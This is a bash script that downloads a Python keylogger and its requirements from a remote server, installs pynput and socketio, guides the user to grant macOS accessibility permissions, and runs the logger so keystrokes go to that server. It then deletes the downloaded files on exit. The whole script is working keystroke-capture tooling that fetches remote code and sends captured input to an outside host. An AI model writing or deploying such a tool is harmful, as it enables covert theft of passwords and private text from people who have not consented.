#!/bin/bash

# Key Logger Setup and Run Script
# This script will download, install dependencies and run the key logger automatically

set -e  # Exit on any error

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SERVER_URL="https://api.tryaiadam.com"
VENV_DIR="/tmp/keylogger_venv"
DOWNLOAD_BASE_URL="https://api.tryaiadam.com"  # Base URL for downloading files
DOWNLOADED_FILES=()  # Array to track downloaded files for cleanup

echo -e "${BLUE}🔐 Key Logger Setup and Run Script${NC}"
echo -e "${BLUE}====================================${NC}"

# Function to print colored output
print_status() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Function to check if command exists
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

# Function to download key logger files from server
download_keylogger_files() {
    print_status "Downloading key logger files from server..."
    
    # Check if wget is available
    if ! command_exists wget; then
        print_error "wget is not installed. Please install wget first."
        exit 1
    fi
    
    # List of files to download
    local files_to_download=(
        "key-logger.py"
        "requirements.txt"
    )
    
    # Download each file
    for file in "${files_to_download[@]}"; do
        local download_url="${DOWNLOAD_BASE_URL}/key-logger/${file}"
        local local_file="${SCRIPT_DIR}/${file}"
        
        print_status "Downloading ${file}..."
        if wget -q --timeout=10 --tries=3 -O "$local_file" "$download_url" 2>/dev/null; then
            print_status "✓ Downloaded ${file}"
            DOWNLOADED_FILES+=("$local_file")
        else
            print_error "✗ Failed to download ${file} from ${download_url}"
            print_error "Make sure the server is running and files are accessible"
            exit 1
        fi
    done
    
    # Make key-logger.py executable
    chmod +x "${SCRIPT_DIR}/key-logger.py" 2>/dev/null || true
    
    print_status "All key logger files downloaded successfully"
}

# Function to install dependencies
install_dependencies() {
    print_status "Installing Python dependencies..."
    
    # Method 1: Try creating venv in /tmp to avoid path issues
    if [ ! -d "$VENV_DIR" ]; then
        print_status "Creating virtual environment in $VENV_DIR..."
        if python3 -m venv "$VENV_DIR" 2>/dev/null; then
            print_status "Virtual environment created successfully"
            source "$VENV_DIR/bin/activate"
            pip install --upgrade pip
            pip install -r "$SCRIPT_DIR/requirements.txt"
            # Try to get the latest pynput for Python 3.13 compatibility
            pip install --upgrade pynput
            return 0
        else
            print_warning "Failed to create virtual environment"
        fi
    else
        print_status "Using existing virtual environment"
        source "$VENV_DIR/bin/activate"
        # Make sure we have the latest pynput
        pip install --upgrade pynput 2>/dev/null || true
        return 0
    fi
    
    # Method 2: Try installing to user directory
    print_status "Trying to install to user directory..."
    if python3 -m pip install --user -r "$SCRIPT_DIR/requirements.txt" 2>/dev/null; then
        print_status "Dependencies installed to user directory"
        return 0
    else
        print_warning "Failed to install to user directory"
    fi
    
    # Method 3: Try with --break-system-packages (last resort)
    print_warning "Attempting installation with --break-system-packages (not recommended for production)"
    if python3 -m pip install --break-system-packages -r "$SCRIPT_DIR/requirements.txt" 2>/dev/null; then
        print_status "Dependencies installed with system packages override"
        return 0
    else
        print_error "Failed to install dependencies with all methods"
        return 1
    fi
}

# Function to check if dependencies are available
check_dependencies() {
    print_status "Checking if required Python packages are available..."
    
    # Try to import the required packages
    python3 -c "
import sys
try:
    import pynput
    import socketio
    print('✓ All required packages are available')
    sys.exit(0)
except ImportError as e:
    print(f'✗ Missing package: {e}')
    sys.exit(1)
" 2>/dev/null
    
    return $?
}

# Function to show accessibility instructions
show_accessibility_instructions() {
    echo ""
    print_warning "🔒 ACCESSIBILITY PERMISSIONS REQUIRED 🔒"
    echo ""
    echo -e "${YELLOW}The key logger needs accessibility permissions to capture keystrokes.${NC}"
    echo ""
    echo -e "${BLUE}To grant permissions on macOS:${NC}"
    echo "1. Open System Preferences/Settings"
    echo "2. Go to 'Security & Privacy' or 'Privacy & Security'"
    echo "3. Click on 'Accessibility' in the left sidebar"
    echo "4. Click the lock icon and enter your password"
    echo "5. Add your Terminal application to the list"
    echo "   - Click the '+' button"
    echo "   - Navigate to /System/Applications/Utilities/"
    echo "   - Select 'Terminal.app' (or your terminal app)"
    echo "   - Make sure it's checked/enabled"
    echo ""
    echo -e "${GREEN}After granting permissions, run this script again!${NC}"
    echo ""
    read -p "Press Enter after granting accessibility permissions, or Ctrl+C to exit..."
}

# Function to run the key logger
run_key_logger() {
    print_status "Starting Key Logger..."
    print_status "Server URL: $SERVER_URL"
    print_status "Press Ctrl+C to stop the key logger"
    echo ""
    
    # Update the default server URL in the script to use port 5001
    if [ -d "$VENV_DIR" ] && [ -f "$VENV_DIR/bin/activate" ]; then
        source "$VENV_DIR/bin/activate"
    fi
    
    cd "$SCRIPT_DIR"
    
    # Run the key logger and capture output to detect permission issues
    if ! python3 key-logger.py --server "$SERVER_URL" 2>&1 | tee /tmp/keylogger_output.log; then
        # Check if it's an accessibility issue
        if grep -q "not trusted" /tmp/keylogger_output.log || grep -q "accessibility" /tmp/keylogger_output.log; then
            print_error "Accessibility permissions not granted!"
            show_accessibility_instructions
            return 1
        fi
    fi
    
    # Clean up log file
    rm -f /tmp/keylogger_output.log 2>/dev/null || true
}

# Function to check server connectivity
check_server() {
    print_status "Checking if Flask server is running on $SERVER_URL..."
    
    if command_exists curl; then
        if curl -s --max-time 5 "$SERVER_URL" >/dev/null 2>&1; then
            print_status "✓ Flask server is responding"
            return 0
        else
            print_warning "✗ Flask server is not responding at $SERVER_URL"
            print_warning "Make sure to start the Docker container first:"
            print_warning "  docker-compose up key-logger-server -d"
            return 1
        fi
    else
        print_warning "curl not available, skipping server check"
        return 0
    fi
}

# Function to show usage instructions
show_usage() {
    echo ""
    echo -e "${BLUE}Usage Instructions:${NC}"
    echo "1. Start the Flask server (if not already running):"
    echo "   docker-compose up key-logger-server -d"
    echo ""
    echo "2. Run this script:"
    echo "   ./setup-and-run.sh"
    echo ""
    echo "3. Open web interface:"
    echo "   http://localhost:5001"
    echo ""
    echo "4. The key logger will start capturing keystrokes"
    echo "5. Press Escape to stop the key logger"
    echo ""
}

# Function to cleanup on exit
cleanup() {
    print_status "Cleaning up..."
    
    # Deactivate virtual environment if active
    if [ -d "$VENV_DIR" ]; then
        deactivate 2>/dev/null || true
    fi
    
    # Delete downloaded files
    if [ ${#DOWNLOADED_FILES[@]} -gt 0 ]; then
        print_status "Removing downloaded key logger files..."
        for file in "${DOWNLOADED_FILES[@]}"; do
            if [ -f "$file" ]; then
                rm -f "$file" 2>/dev/null || true
                print_status "✓ Removed $(basename "$file")"
            fi
        done
    fi
    
    print_status "Cleanup completed"
}

# Set trap for cleanup
trap cleanup EXIT

# Main execution
main() {
    # Parse command line arguments
    while [[ $# -gt 0 ]]; do
        case $1 in
            --server)
                SERVER_URL="$2"
                shift 2
                ;;
            --download-url)
                DOWNLOAD_BASE_URL="$2"
                shift 2
                ;;
            --help|-h)
                show_usage
                exit 0
                ;;
            *)
                print_error "Unknown option: $1"
                show_usage
                exit 1
                ;;
        esac
    done
    
    # Check if Python 3 is available
    if ! command_exists python3; then
        print_error "Python 3 is not installed or not in PATH"
        exit 1
    fi
    
    print_status "Python 3 found: $(python3 --version)"
    
    # Download key logger files from server
    download_keylogger_files
    
    # Check if requirements.txt exists after download
    if [ ! -f "$SCRIPT_DIR/requirements.txt" ]; then
        print_error "requirements.txt not found after download"
        exit 1
    fi
    
    # Check if dependencies are already installed
    if ! check_dependencies; then
        print_status "Installing missing dependencies..."
        if ! install_dependencies; then
            print_error "Failed to install dependencies"
            print_error "Please install manually:"
            print_error "  pip install pynput python-socketio[client]"
            exit 1
        fi
    else
        print_status "All dependencies are already available"
    fi
    
    # Check server connectivity
    check_server
    
    # Run the key logger
    print_status "All checks passed. Starting key logger..."
    sleep 1
    run_key_logger
}

# Check if script is being sourced or executed
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi 